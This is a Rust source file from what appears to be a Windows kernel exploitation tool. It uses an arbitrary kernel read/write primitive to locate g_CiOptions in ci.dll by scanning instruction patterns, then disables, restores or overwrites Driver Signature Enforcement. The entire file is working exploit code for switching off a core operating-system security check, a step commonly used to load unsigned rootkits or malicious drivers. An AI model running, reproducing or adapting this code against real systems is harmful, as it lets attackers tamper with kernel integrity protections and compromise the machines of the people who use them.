use anyhow::{bail, Context, Result};
use std::collections::HashMap;

use crate::device::Device;
use crate::kernel_rw::KernelRW;
use crate::utils::{find_mod, get_kernel_modules, ntoskrnl_disk_path};

const SCN_CNT_CODE: u32        = 0x0000_0020;
const SCN_MEM_EXECUTE: u32     = 0x2000_0000;
const SCN_MEM_WRITE: u32       = 0x8000_0000;
const SCN_MEM_DISCARDABLE: u32 = 0x0200_0000;

fn kread_dword(krw: &KernelRW, va: u64) -> Result<u32> {
    let aligned = va & !7u64;
    let offset  = (va & 7) as usize;
    if offset + 4 > 8 {
        let qw1 = krw.kread(aligned)?;
        let qw2 = krw.kread(aligned + 8)?;
        let b1 = qw1.to_le_bytes();
        let b2 = qw2.to_le_bytes();
        let from_first = 8 - offset;
        let mut b = [0u8; 4];
        b[..from_first].copy_from_slice(&b1[offset..]);
        b[from_first..].copy_from_slice(&b2[..4 - from_first]);
        return Ok(u32::from_le_bytes(b));
    }
    let qw = krw.kread(aligned)?;
    let b = qw.to_le_bytes();
    Ok(u32::from_le_bytes([b[offset], b[offset+1], b[offset+2], b[offset+3]]))
}

fn kwrite_dword(krw: &KernelRW, va: u64, value: u32) -> Result<()> {
    let aligned = va & !7u64;
    let offset  = (va & 7) as usize;
    if offset + 4 > 8 {
        let qw1 = krw.kread(aligned)?;
        let qw2 = krw.kread(aligned + 8)?;
        let mut b1 = qw1.to_le_bytes();
        let mut b2 = qw2.to_le_bytes();
        let vb = value.to_le_bytes();
        let from_first = 8 - offset;
        b1[offset..].copy_from_slice(&vb[..from_first]);
        b2[..4 - from_first].copy_from_slice(&vb[from_first..]);
        krw.kwrite(aligned,     u64::from_le_bytes(b1))?;
        krw.kwrite(aligned + 8, u64::from_le_bytes(b2))?;
        return Ok(());
    }
    let qw = krw.kread(aligned)?;
    let mut b = qw.to_le_bytes();
    b[offset..offset+4].copy_from_slice(&value.to_le_bytes());
    krw.kwrite(aligned, u64::from_le_bytes(b))
}

fn valid_ci_options_value(v: u32) -> bool {
    v == 0 || v == 6 || v == 8 || (v & 0xFFFF_0000 == 0)
}

fn ci_dll_disk_path() -> Result<String> {
    let sysroot = std::env::var("SYSTEMROOT").unwrap_or_else(|_| "C:\\Windows".to_string());
    Ok(format!("{}\\system32\\ci.dll", sysroot))
}

fn rva_to_off(pe: &[u8], rva: u32, sec_table: usize, nsec: usize) -> Option<usize> {
    for i in 0..nsec {
        let sh  = sec_table + i * 40;
        if sh + 40 > pe.len() { break; }
        let va  = u32::from_le_bytes(pe[sh+12..sh+16].try_into().ok()?) as usize;
        let vsz = u32::from_le_bytes(pe[sh+ 8..sh+12].try_into().ok()?) as usize;
        let raw = u32::from_le_bytes(pe[sh+20..sh+24].try_into().ok()?) as usize;
        let r = rva as usize;
        if r >= va && r < va + vsz { return Some(raw + (r - va)); }
    }
    None
}

fn disk_dword(pe: &[u8], rva: u32, sec_table: usize, nsec: usize) -> Option<u32> {
    let off = rva_to_off(pe, rva, sec_table, nsec)?;
    if off + 4 > pe.len() { return None; }
    Some(u32::from_le_bytes(pe[off..off+4].try_into().ok()?))
}

fn base_score(disk_val: Option<u32>, writable: bool) -> i32 {
    let mut s = 0i32;
    match disk_val {
        Some(6) | Some(8)               => s += 120,
        Some(0)                         => s += 20,
        Some(v) if v & 0xFFFF_0000 == 0 => s += 90,
        _ => {}
    }
    if writable { s += 10; }
    s
}

fn find_g_ci_options_rva(pe: &[u8]) -> Result<Vec<u32>> {
    if pe.len() < 0x40 || pe[0..2] != [0x4D, 0x5A] { bail!("ci.dll: bad MZ"); }
    let e_lfanew  = u32::from_le_bytes(pe[0x3C..0x40].try_into()?) as usize;
    if e_lfanew + 28 > pe.len() { bail!("ci.dll: e_lfanew OOB"); }
    if pe[e_lfanew..e_lfanew+4] != [0x50, 0x45, 0x00, 0x00] { bail!("ci.dll: bad PE sig"); }

    let nsec    = u16::from_le_bytes(pe[e_lfanew+ 6..e_lfanew+ 8].try_into()?) as usize;
    let opt_sz  = u16::from_le_bytes(pe[e_lfanew+20..e_lfanew+22].try_into()?) as usize;
    let opt_off = e_lfanew + 24;
    if opt_off + 2 > pe.len() { bail!("ci.dll: optional header missing"); }
    let magic = u16::from_le_bytes(pe[opt_off..opt_off+2].try_into()?);
    if magic != 0x020B { bail!("ci.dll: not PE32+ (magic=0x{:04X})", magic); }

    let image_size = u32::from_le_bytes(pe[opt_off+0x38..opt_off+0x3C].try_into()?) as u64;
    let sec_table  = e_lfanew + 24 + opt_sz;

    struct SecInfo { va: u32, size: u32, chars: u32, raw_off: u32, raw_sz: u32 }
    let mut sections: Vec<SecInfo> = Vec::new();
    for i in 0..nsec {
        let sh = sec_table + i * 40;
        if sh + 40 > pe.len() { break; }
        sections.push(SecInfo {
            va:      u32::from_le_bytes(pe[sh+12..sh+16].try_into().unwrap()),
            size:    u32::from_le_bytes(pe[sh+ 8..sh+12].try_into().unwrap()),
            chars:   u32::from_le_bytes(pe[sh+36..sh+40].try_into().unwrap()),
            raw_off: u32::from_le_bytes(pe[sh+20..sh+24].try_into().unwrap()),
            raw_sz:  u32::from_le_bytes(pe[sh+16..sh+20].try_into().unwrap()),
        });
    }

    let is_writable = |rva: u32| -> bool {
        sections.iter().any(|s| rva >= s.va && rva < s.va + s.size && s.chars & SCN_MEM_WRITE != 0)
    };

    const RIP_MODS: &[u8] = &[0x05, 0x0D, 0x15, 0x1D, 0x25, 0x2D, 0x35, 0x3D];

    let rip_target = |instr_rva: u32, instr_len: u32, rel32: i32| -> Option<u32> {
        let next   = instr_rva as i64 + instr_len as i64;
        let target = next + rel32 as i64;
        if target < 0 || target as u64 >= image_size { return None; }
        Some(target as u32)
    };

    let mut ref_counts:     HashMap<u32, u32>         = HashMap::new();
    let mut quality_counts: HashMap<u32, u32>         = HashMap::new();
    let mut best_scores:    HashMap<u32, i32>         = HashMap::new();
    let mut disk_cache:     HashMap<u32, Option<u32>> = HashMap::new();
    let mut writable_map:   HashMap<u32, bool>        = HashMap::new();

    macro_rules! record {
        ($rva:expr, $bonus:expr) => { record!($rva, $bonus, false) };
        ($rva:expr, $bonus:expr, $quality:expr) => {{
            let rva: u32   = $rva;
            let bonus: i32 = $bonus;
            *ref_counts.entry(rva).or_insert(0) += 1;
            if $quality { *quality_counts.entry(rva).or_insert(0) += 1; }
            let dv = *disk_cache.entry(rva).or_insert_with(|| disk_dword(pe, rva, sec_table, nsec));
            let wr = *writable_map.entry(rva).or_insert_with(|| is_writable(rva));
            let score = base_score(dv, wr) + bonus;
            let e = best_scores.entry(rva).or_insert(i32::MIN);
            if score > *e { *e = score; }
        }};
    }

    for sec in &sections {
        if sec.chars & (SCN_CNT_CODE | SCN_MEM_EXECUTE) == 0 { continue; }
        if sec.chars & SCN_MEM_DISCARDABLE != 0 { continue; }
        if sec.size == 0 { continue; }
        let raw_start = sec.raw_off as usize;
        let raw_end   = (sec.raw_off + sec.raw_sz) as usize;
        if raw_start >= pe.len() { continue; }
        let raw_end   = raw_end.min(pe.len());
        let data      = &pe[raw_start..raw_end];
        let lim       = if data.len() > 14 { data.len() - 14 } else { continue };

        for p in 0..lim {
            let b0 = data[p];
            let b1 = data[p + 1];
            let instr_rva = sec.va + p as u32;

            macro_rules! rel32 {
                ($off:expr) => { i32::from_le_bytes(data[p+$off..p+$off+4].try_into().unwrap()) };
            }
            macro_rules! u32_at {
                ($off:expr) => { u32::from_le_bytes(data[p+$off..p+$off+4].try_into().unwrap()) };
            }

            if matches!(b0, 0x89 | 0x8B | 0x39 | 0x3B | 0x31 | 0x33)
                && RIP_MODS.contains(&b1) && p + 6 <= data.len()
            {
                if let Some(rva) = rip_target(instr_rva, 6, rel32!(2)) { record!(rva, 30); }
            }

            if b0 == 0x8D && RIP_MODS.contains(&b1) && p + 6 <= data.len() {
                if let Some(rva) = rip_target(instr_rva, 6, rel32!(2)) { record!(rva, 25); }
            }

            if b0 == 0xFF && (b1 == 0x05 || b1 == 0x0D) && p + 6 <= data.len() {
                if let Some(rva) = rip_target(instr_rva, 6, rel32!(2)) { record!(rva, 20); }
            }

            if b0 == 0xC7 && RIP_MODS.contains(&b1) && p + 10 <= data.len() {
                if let Some(rva) = rip_target(instr_rva, 10, rel32!(2)) {
                    let imm = u32_at!(6);
                    record!(rva, 40 + if imm == 6 || imm == 8 { 20 } else { 0 });
                }
            }

            if b0 == 0x83 && RIP_MODS.contains(&b1) && p + 7 <= data.len() {
                if let Some(rva) = rip_target(instr_rva, 7, rel32!(2)) {
                    if b1 == 0x3D {
                        let jcc  = p + 7 < data.len() && matches!(data[p+7], 0x74 | 0x75 | 0x0F);
                        let imm8 = data[p+6];
                        let bonus = (if jcc { 85 } else { 55 }) + if imm8 == 6 || imm8 == 8 { 20 } else { 0 };
                        record!(rva, bonus, jcc);
                    } else {
                        record!(rva, 25);
                    }
                }
            }

            if b0 == 0x81 && RIP_MODS.contains(&b1) && p + 10 <= data.len() {
                if let Some(rva) = rip_target(instr_rva, 10, rel32!(2)) {
                    if b1 == 0x3D {
                        let jcc   = p + 10 < data.len() && matches!(data[p+10], 0x74 | 0x75 | 0x0F);
                        let imm32 = u32_at!(6);
                        let bonus = (if jcc { 85 } else { 55 }) + if imm32 == 6 || imm32 == 8 { 20 } else { 0 };
                        record!(rva, bonus, jcc);
                    } else {
                        record!(rva, 25);
                    }
                }
            }

            if b0 == 0xF7 && b1 == 0x05 && p + 10 <= data.len() {
                if let Some(rva) = rip_target(instr_rva, 10, rel32!(2)) {
                    let jcc = p + 10 < data.len() && matches!(data[p+10], 0x74 | 0x75 | 0x0F);
                    record!(rva, if jcc { 85 } else { 55 }, jcc);
                }
            }

            if b0 == 0x8B && b1 == 0x05 && p + 9 <= data.len() {
                if let Some(rva) = rip_target(instr_rva, 6, rel32!(2)) {
                    let b6 = data[p+6]; let b7 = data[p+7]; let b8 = data[p+8];
                    let is_check =
                        (b6 == 0x85 && b7 == 0xC0 && matches!(b8, 0x74 | 0x75 | 0x0F))
                        || (b6 == 0x83 && b7 == 0xF8
                            && p + 10 <= data.len() && matches!(data[p+9], 0x74 | 0x75 | 0x0F));
                    record!(rva, if is_check { 75 } else { 30 }, is_check);
                }
            }

            if b0 & 0xF0 == 0x40 && p + 2 < data.len() {
                let b2 = data[p + 2];
                if b1 == 0xC7 && RIP_MODS.contains(&b2) && p + 11 <= data.len() {
                    if let Some(rva) = rip_target(instr_rva, 11, rel32!(3)) {
                        let imm = u32_at!(7);
                        record!(rva, 40 + if imm == 6 || imm == 8 { 20 } else { 0 });
                    }
                }
                if b1 == 0x8B && RIP_MODS.contains(&b2) && p + 7 <= data.len() {
                    if let Some(rva) = rip_target(instr_rva, 7, rel32!(3)) { record!(rva, 30); }
                }
                if b1 == 0x89 && RIP_MODS.contains(&b2) && p + 7 <= data.len() {
                    if let Some(rva) = rip_target(instr_rva, 7, rel32!(3)) { record!(rva, 30); }
                }
                if b1 == 0x8D && RIP_MODS.contains(&b2) && p + 7 <= data.len() {
                    if let Some(rva) = rip_target(instr_rva, 7, rel32!(3)) { record!(rva, 25); }
                }
                if b1 == 0x83 && RIP_MODS.contains(&b2) && p + 8 <= data.len() {
                    if let Some(rva) = rip_target(instr_rva, 8, rel32!(3)) {
                        let jcc = b2 == 0x3D && p + 8 < data.len()
                            && matches!(data[p+8], 0x74 | 0x75 | 0x0F);
                        record!(rva, if b2 == 0x3D { 55 } else { 20 }, jcc);
                    }
                }
                if b1 == 0xFF && (b2 == 0x05 || b2 == 0x0D) && p + 7 <= data.len() {
                    if let Some(rva) = rip_target(instr_rva, 7, rel32!(3)) { record!(rva, 20); }
                }
            }
        }
    }

    if ref_counts.is_empty() {
        bail!("g_CiOptions scan: no RIP-relative references found in ci.dll");
    }

    let mut candidates: Vec<u32> = ref_counts.iter()
        .filter(|kv| *writable_map.get(kv.0).unwrap_or(&false))
        .map(|kv| *kv.0)
        .collect();

    candidates.sort_by(|&a, &b| {
        let qa = *quality_counts.get(&a).unwrap_or(&0);
        let qb = *quality_counts.get(&b).unwrap_or(&0);
        let ra = *ref_counts.get(&a).unwrap_or(&0);
        let rb = *ref_counts.get(&b).unwrap_or(&0);
        qb.cmp(&qa).then(rb.cmp(&ra)).then(a.cmp(&b))
    });

    if candidates.is_empty() {
        bail!("g_CiOptions scan: no writable candidates found in ci.dll");
    }
    Ok(candidates)
}

fn kread_dword_disk(pe: &[u8], rva: u32) -> Option<u32> {
    if pe.len() < 0x40 { return None; }
    let e_lfanew = u32::from_le_bytes(pe[0x3C..0x40].try_into().ok()?) as usize;
    if e_lfanew + 28 > pe.len() { return None; }
    let nsec    = u16::from_le_bytes(pe[e_lfanew+ 6..e_lfanew+ 8].try_into().ok()?) as usize;
    let opt_sz  = u16::from_le_bytes(pe[e_lfanew+20..e_lfanew+22].try_into().ok()?) as usize;
    let sec_tbl = e_lfanew + 24 + opt_sz;
    disk_dword(pe, rva, sec_tbl, nsec)
}

pub fn cmd_dse(dev: &Device, action: &str, set_value: Option<u32>) -> Result<()> {
    let mods = get_kernel_modules()?;
    let nt = crate::utils::resolve_ntoskrnl(dev, &mods)?;
    let ci = find_mod(&mods, &["ci.dll"])
        .context("ci.dll not found in loaded module list")?;

    let nt_path = ntoskrnl_disk_path(&mods)?;
    let nt_pe   = std::fs::read(&nt_path)
        .with_context(|| format!("cannot read {}", nt_path))?;

    let ci_path = ci_dll_disk_path()?;
    let ci_pe   = std::fs::read(&ci_path)
        .with_context(|| format!("cannot read {}", ci_path))?;

    let krw = KernelRW::setup(dev, &nt_pe, nt.va)?;

    println!("[*] ci.dll loaded VA=0x{:016X}  size=0x{:X}", ci.va, ci.size);

    let candidates = find_g_ci_options_rva(&ci_pe)?;

    let mut selected: Option<(u32, u64, u32)> = None;
    for &rva in &candidates {
        let va   = ci.va + rva as u64;
        let live = kread_dword(&krw, va)?;
        if valid_ci_options_value(live) {
            selected = Some((rva, va, live));
            break;
        }
    }

    let (g_ci_options_rva, g_ci_options_va, live_check) = selected
        .context("cannot locate g_CiOptions: no candidate has a valid live value")?;

    println!("[*] g_CiOptions VA=0x{:016X}", g_ci_options_va);

    match action {
        "status" => {
            let state = if live_check == 0 { "DISABLED" } else { "ENABLED" };
            println!("[DSE] g_CiOptions=0x{:X}  ({})", live_check, state);
        }

        "disable" | "0" => {
            if live_check == 0 {
                println!("[!] DSE already disabled");
                return Ok(());
            }
            kwrite_dword(&krw, g_ci_options_va, 0)?;
            let rb = kread_dword(&krw, g_ci_options_va)?;
            if rb != 0 { bail!("verify failed: readback=0x{:X}", rb); }
            println!("[+] DSE disabled (was 0x{:X})", live_check);
        }

        "enable" | "1" => {
            if live_check != 0 {
                println!("[!] DSE already enabled (g_CiOptions=0x{:X})", live_check);
                return Ok(());
            }
            let disk_default = kread_dword_disk(&ci_pe, g_ci_options_rva).unwrap_or(0);
            let restore = if disk_default == 6 || disk_default == 8 { disk_default } else { 6 };
            kwrite_dword(&krw, g_ci_options_va, restore)?;
            let rb = kread_dword(&krw, g_ci_options_va)?;
            println!("[+] DSE enabled (g_CiOptions=0x{:X})", rb);
        }

        "set" => {
            let val = set_value.context("dse set requires a value argument")?;
            kwrite_dword(&krw, g_ci_options_va, val)?;
            let rb = kread_dword(&krw, g_ci_options_va)?;
            if rb != val { bail!("verify failed: wrote 0x{:X}, readback=0x{:X}", val, rb); }
            println!("[+] g_CiOptions 0x{:X} -> 0x{:X}", live_check, rb);
        }

        _ => bail!("unknown dse action '{}' (status | disable/0 | enable/1 | set <val>)", action),
    }

    Ok(())
}
